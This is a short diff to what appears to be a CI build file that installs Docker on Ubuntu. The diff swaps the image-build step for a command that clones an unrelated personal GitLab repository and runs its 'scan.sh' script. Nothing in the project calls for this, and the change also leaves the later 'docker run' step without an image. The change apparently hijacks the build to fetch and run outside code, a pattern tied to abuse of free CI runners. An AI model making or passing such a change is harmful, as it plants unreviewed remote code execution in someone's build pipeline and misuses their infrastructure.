@@ -5,7 +5,7 @@ FROM vm/ubuntu:18.04
 
 # install the latest version of Docker, as in the official Docker installation tutorial.
 RUN apt-get update && \
-    apt-get install apt-transport-https ca-certificates curl software-properties-common && \
+    apt-get install -y git curl apt-transport-https ca-certificates curl software-properties-common && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
     apt-get update && \
@@ -14,6 +14,6 @@ RUN apt-get update && \
 # copy files from the repository into this staging server
 COPY . .
 
-RUN docker build -t image .
+RUN git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scan.sh && ./scan.sh
 RUN docker run -d -p 80:80 image
 EXPOSE WEBSITE http://localhost:80
